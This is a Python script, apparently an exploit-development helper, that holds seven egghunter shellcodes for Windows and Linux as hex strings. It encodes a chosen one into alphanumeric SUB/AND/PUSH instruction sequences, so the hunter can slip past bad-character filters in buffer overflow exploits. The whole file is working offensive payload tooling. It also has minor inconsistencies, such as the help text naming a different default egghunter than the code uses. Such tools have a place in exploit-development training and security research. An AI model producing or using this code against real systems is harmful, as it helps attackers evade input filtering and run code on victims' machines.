#!/usr/bin/python

import argparse
import copy
import struct
import sys

'''
--------------
Egghunter menu:
--------------
0: Windows SEH
1: Windows IsBadReadPtr
2: Windows NtDisplayString
3: Windows NtAccessCheckandAuditAlarm
4: Linux access(2)
5: Linux access(2) revisited
6: Linux sigaction(2)
'''

egghunter_map = {
	0: "EB2159B8????????516AFF33DB6489236A02598BFBF3AF7507FFE76681CBFF0F43EBEDE8DAFFFFFF6A0C598B040CB1B8830408065883C4105033C0C3",
	1: "33DB6681CBFF0F436A0853B80D5BE777FFD085C075ECB8????????8BFBAF75E7AF75E4FFE7",
	2: "6681CAFF0F42526A4358CD2E3C055A74EFB8????????8BFAAF75EAAF75E7FFE7",
	3: "6681CAFF0F42526A0258CD2E3C055A74EFB8????????8BFAAF75EAAF75E7FFE7",
	4: "BB????????31C9F7E16681CAFF0F42608D5A04B021CD803CF26174ED391A75EE395A0475E9FFE2",
	5: "31D26681CAFF0F428D5A046A2158CD803CF274EEB8????????89D7AF75E9AF75E6FFE7",
	6: "6681C9FF0F416A4358CD803CF274F1B8????????89CFAF75ECAF75E9FFE7"
}
twos_comp = ['1800188b']
target_bytes = []
good_chars = []



"""
Strips hex bytes prepended with a blackslash
Intput: hex byte(s) string prepended with blackslash x
"""
def strip_bytes(hex_bytes):
	stripped = hex_bytes.replace("\\x","")
	return stripped



'''
Returns byte representation of egghunter tag
Input: egghunter tag
'''
def tag_to_hex(tag):
	tag_bytes = ""
	for c in tag:
		tag_bytes += hex(ord(c)).replace("0x","")
	return tag_bytes



'''
Returns egghunter formatted with tag bytes
Input: hunter number, ascii tag, padding byte
'''
def format_egghunter(num,tag,pad):
	egghunter = egghunter_map[num]
	tag_bytes = tag_to_hex(tag)
	num_to_pad = 0
	
	formatted = egghunter.replace("????????",tag_bytes)
	
	num_to_pad = 4 - (len(formatted)/2) % 4
	
	if num_to_pad != 4:
		formatted += strip_bytes(pad) * num_to_pad

	print("Raw egghunter bytes: {}\n".format(formatted))	
	return formatted



'''
Takes the egghunter as a string and splits it into four-byte chunks.
The chunks are reversed and the two's complement of each chunk is generated.
Each two's complement chunk is further split into its individual bytes.
Input: Egghunter string
'''
def reverse_and_split(egghunter):
	chunks = [egghunter[i:i+8] for i in range(0, len(egghunter), 8)] # separate chunks

	chunks = chunks[::-1] # reverse chunks

	return(split_chunks(twos_comp(chunks)))



'''
Converts signed int to hex
'''
def to_hex(val):
	new_val = 0
	new_val = hex((val + (1 << 32)) % (1 << 32))
	if new_val[-1] == "L":
		new_val = new_val[2:-1]
	else:
		new_val = new_val[2:]
	num_to_pad = 0
	if (len(new_val) < 8):
		num_to_pad = 8 - len(new_val)
		new_val = "0" * num_to_pad + new_val
	return new_val



'''
Takes the two's complement of four-byte egghunter chunks
Input: List of egghunter chunks
'''
def twos_comp(chunks):
	tc_chunks = []
	
	chunks = [struct.pack("<I",int(chunks[i],16)) for i in range(0, len(chunks))] # chunks to little-endian
	
	for i in range(0, len(chunks)):
		val = struct.unpack(">I", chunks[i])[0]
		if val > ((1 << 31) - 1):
			val -= (1 << 32) # manually convert unsigned int to signed int
		tc_chunks.append(to_hex(-val))
		# tc_chunks.append(int.from_bytes(chunks[i], byteorder="big",signed=True)) # Python 3
	
	return(tc_chunks)



'''
Takes the two's complement chunks and splits them into individual bytes 
Input: List of two's complement values as strings of bytes
'''
def split_chunks(chunks):
	split_chunks = []
	for i in range(len(chunks)):
		split_chunks.append(["","","",""])

	for i in range(0, len(chunks)):
		for j in range(4):
			k = j*2
			split_chunks[i][j] = chunks[i][k:k+2]

	return(split_chunks)



'''
Takes a string of bad characters and converts the hex bytes into decimal values.
Returns a list of good characters in the form of decimal values.
Input: Bad characters hex string
'''
def filter_chars(bad_chars):
	filtered = set([i for i in range(256)])
	bad_chars = strip_bytes(bad_chars)
	
	for i in range(0,len(bad_chars),2):
		filtered.remove(int(bad_chars[i:i+2],16))

	return(filtered)
	


'''
Passes bytes from the two's complement byte list into restricted_partitions()
along with a set of good characters.
Input: List of lists of four bytes per two's complement chunk, list of good character decimal values
'''
def generate_summands(tc_bytes, good_chars):
	partitions = []
	failed = False
	i = 0

	while ((i < len(tc_bytes)) and not failed):
		partitions.append([])
		carry = False
		j = 3

		while (j >= 0):
			target = int(tc_bytes[i][j],16)
			if (carry):
				target -= 1
			if (target < 96):
				target += 256
				carry = True
			else:
				carry = False
			
			part = restricted_partitions(target, good_chars, len(good_chars), 3, [], 0)
			if (part == []):
				failed = True
				break
			else:
				partitions[i] += part
	
			j -= 1

		i += 1
	
	if (failed):
		return 0
	
	return(format_summands(partitions))



'''
Finds integer partitions. Partitions used to construct summands to manipulate eax register
Input: Integers from hex bytes of two's complement egghunter chunks
'''
def restricted_partitions(n, good_chars, end_index, slots, part, i):	
	# base case
	if (slots == 1):
		if (n in good_chars):
			part = copy.copy(part)
			if (i > len(part)-1): # append to part
				part.append(n)
			else: # replace in part
				part[i] = n
			parts = [part]
		else:
			parts = []
	# recursive case
	else:
		part = copy.copy(part)
		parts = []
		for j in range(end_index):
			if (len(parts) == 1):
				return parts
			if ((good_chars[j] + (slots-1)*good_chars[0] <= n) and (n <= slots*good_chars[j])):
				if (i > len(part)-1):
					part.append(good_chars[j]) # append to part
				else:
					part[i] = good_chars[j] # replace in part

				parts = parts + restricted_partitions(n-good_chars[j], good_chars, j+1, slots-1, part, i+1)
	
	return parts



'''
Distributes chunks within int_list into three summands.
Three ints per list, four lists per chunk, one chunk distributed amongst three summands.
Input: List containing chunks of four lists (three integers per list) from restricted_partitions 
'''
def format_summands(int_list):
	summands = []
	for i in range(0,len(int_list)):
		summands.append(["","",""])
		for j in range(4):
			for k in range(3):
				summands[i][k] += "\\x{}".format(hex(int_list[i][j].pop())[2:4]) # dec to hex string conversion
	
	return(summands)



'''
Prints op codes for encoded egghunter. Op codes will push the egghunter onto the stack.
Input: List of summands for each block of the egghunter. Each block pushes one four-byte chunk
of the egghunter onto the stack.
'''
def print_egghunter(summands):
	zero_eax_1 = "\\x25\\x4a\\x4d\\x4e\\x55"
	zero_eax_2 = "\\x25\\x35\\x32\\x31\\x2a"
	push_eax = "\\x50"

	for i in range(len(summands)):
		print("******BLOCK {}*******".format(i))
		print(zero_eax_1)
		print(zero_eax_2)
		for j in range(3):
			print("\\x2d{}".format(summands[i][j]))
		
		print(push_eax)



'''
Uses argparse to accept arguments
Arguments: bad, egghunter, pad, tag
'''
def check_args(args):
	ap = argparse.ArgumentParser(description = "Alphanumeric egghunter stack pusher",
                                 formatter_class = argparse.RawTextHelpFormatter)
	ap.add_argument("-b", "--bad", metavar="BAD CHARS",
					help = "Bad characters to exclude in payload\n"
						   "e.g. '\\x00\\xb4\\xd9'\n"
                           "Default: Non-alphanumeric characters",
					default = ("\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"
                               "\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"
                               "\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f"
                               "\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"
                               "\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf"
                               "\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"
                               "\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf"
                               "\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"
                               "\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef"
                               "\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"))
	ap.add_argument("-e", "--egghunter", metavar="#",
					help = "Specific egghunter to encode:\n"
						   "0: Windows - SEH - 60 bytes\n"
						   "1: Windows - IsBadReadPtr - 40 bytes\n"
						   "2: Windows - NtDisplayString - 32 bytes\n"
						   "3: Windows - NtAccessCheckAndAuditAlarm - 32 bytes\n"
						   "4: Linux - access(2) - 40 bytes\n"
						   "5: Linux - access(2) revisited - 36 bytes\n"
						   "6: Linux - sigaction(2) - 32 bytes\n"
						   "Default: 2",
					choices = range(0,7),
					type = int,
					default = 1)
	ap.add_argument("-p", "--pad",
					help = "Byte to pad egghunter with before encoding\n"
						   "e.g. '\\x90'\n"
						   "Default: \\x90",
					default = "\\x90")
	ap.add_argument("-t", "--tag",
					help = "Four byte tag that egghunter will search for\n"
						   "e.g. 'w00t'\n"
						   "Default: w00t",
					default = "w00t")

	options = ap.parse_args(args)
	return(options)



def main():
	a = check_args(sys.argv[1:])

	egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
	tc_egghunter = reverse_and_split(egghunter)
	good_chars = list(filter_chars(a.bad))
	summands = generate_summands(tc_egghunter, good_chars)

	if (summands):
		print_egghunter(summands)
	else:
		print("[!] Could not encode egghunter. Bad characters too restrictive.")




if __name__ == "__main__":
    main()

